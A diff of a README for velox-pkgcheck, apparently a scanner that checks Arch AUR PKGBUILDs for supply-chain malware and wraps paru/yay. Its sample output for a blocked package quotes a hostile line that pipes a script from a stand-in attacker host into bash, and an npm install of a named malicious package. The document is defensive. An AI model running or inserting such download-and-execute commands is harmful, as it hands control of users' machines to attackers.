@@ -86,43 +86,90 @@ sudo pacman -S velox-welcome
 
 A supply-chain attack scanner that inspects AUR PKGBUILDs **before** installation, protecting against attacks like the [Atomic Arch campaign (June 2026)](https://www.privacyguides.org/news/2026/06/12/around-1-500-aur-packages-compromised-with-rootkit-like-malware/) — where 1,500+ AUR packages were poisoned with an eBPF rootkit and credential stealer.
 
+Comes pre-installed on Velox Linux. On any other Arch system:
+
 ```bash
 sudo pacman -S velox-pkgcheck
 ```
 
-Installs two tools: `velox-pkgcheck` (the scanner) and `aur-install` (a paru/yay wrapper).
+Installs two tools: `velox-pkgcheck` (the scanner) and `aur-install` (a paru/yay wrapper). It also drops symlinks at `/usr/local/bin/paru` and `/usr/local/bin/yay` — so **your existing `paru` and `yay` commands are automatically protected** without changing anything about how you use them.
 
-### aur-install
+### How it works
 
-A drop-in replacement for `paru` or `yay` that automatically scans PKGBUILDs before installing anything. Auto-detects whichever AUR helper you have installed at runtime — switching helpers later keeps you protected.
+Every time you run `paru -S anything` or `yay -S anything`, the scan runs first. Here's exactly what you see for a clean package:
 
-```bash
-# Use instead of paru/yay for AUR installs
-aur-install some-package
-aur-install some-package another-package
+```
+$ paru -S zen-browser
 
-# All paru/yay flags pass through unchanged
-aur-install --noconfirm some-package
+aur-install 1.0.0 (using paru)
 
-# Non-install operations (search, query, remove, upgrade) pass straight through
-aur-install -Syu
-aur-install -Ss firefox
+────────────────────────────────────────────────
+Scanning PKGBUILD: zen-browser
+────────────────────────────────────────────────
+
+velox-pkgcheck 1.0.0 — PKGBUILD Supply-Chain Scanner
+
+Scanning: /tmp/tmp.xK3r7z/zen-browser/PKGBUILD
+  ✓ No suspicious patterns found
+
+════════════════════════════════════════════════
+Total findings: 0
+  CLEAN    — no suspicious patterns detected
+════════════════════════════════════════════════
+
+────────────────────────────────────────────────
+  SCAN PASSED — proceeding with install
+────────────────────────────────────────────────
+
+:: Resolving dependencies...
+[paru proceeds with the install as normal]
 ```
 
-**What happens on install:**
+And if a package is infected (e.g. an Atomic Arch poisoned package):
 
-| Result | Action |
+```
+$ paru -S totally-legit-bin
+
+aur-install 1.0.0 (using paru)
+
+────────────────────────────────────────────────
+Scanning PKGBUILD: totally-legit-bin
+────────────────────────────────────────────────
+
+velox-pkgcheck 1.0.0 — PKGBUILD Supply-Chain Scanner
+
+Scanning: /tmp/tmp.xK3r7z/totally-legit-bin/PKGBUILD
+[CRITICAL] PKGBUILD:12 — Known malicious package: atomic-lockfile
+             ↳     npm install atomic-lockfile minimist chalk
+[HIGH    ] PKGBUILD:13 — Remote code execution: download piped to shell interpreter
+             ↳     curl https://evil.com/payload.sh | bash
+
+════════════════════════════════════════════════
+Total findings: 2
+  CRITICAL — known malicious content; do NOT install
+════════════════════════════════════════════════
+
+────────────────────────────────────────────────
+  CRITICAL — installation BLOCKED
+────────────────────────────────────────────────
+Known malicious content was detected in one or more PKGBUILDs.
+Run with --no-check to bypass this block (strongly not recommended).
+```
+
+The install never happens. paru is never called.
+
+**What each result does:**
+
+| Severity | Action |
 |---|---|
 | Clean / Info | Proceeds automatically |
 | Medium | Prints warning, proceeds |
-| High | Prompts "Install anyway? [y/N]" |
-| Critical | **Blocked** — known malicious content detected |
+| High | Prompts `Install anyway? [y/N]` |
+| Critical | **Hard blocked** — paru/yay never called |
 
-Use `--no-check` to bypass the scan if you know what you're doing.
+### velox-pkgcheck standalone
 
-### velox-pkgcheck
-
-The underlying scanner — use it standalone to inspect any PKGBUILD before installing.
+Use the scanner directly on any PKGBUILD, or to check your system after the fact:
 
 ```bash
 # Scan a specific PKGBUILD
@@ -131,10 +178,11 @@ velox-pkgcheck ~/path/to/PKGBUILD
 # Scan all PKGBUILDs in your paru/yay cache at once
 velox-pkgcheck --scan-aur-cache
 
-# Check installed AUR packages against the Atomic Arch attack window
+# Check installed AUR packages against the Atomic Arch attack window (Jun 9-12 2026)
 velox-pkgcheck --scan-installed
 
-# Check if your system is already compromised (eBPF artifacts, npm/bun cache, systemd services)
+# Check if your system is already compromised
+# (scans for eBPF rootkit artifacts, malicious npm/bun cache, suspicious systemd services)
 velox-pkgcheck --check-system
 ```
 
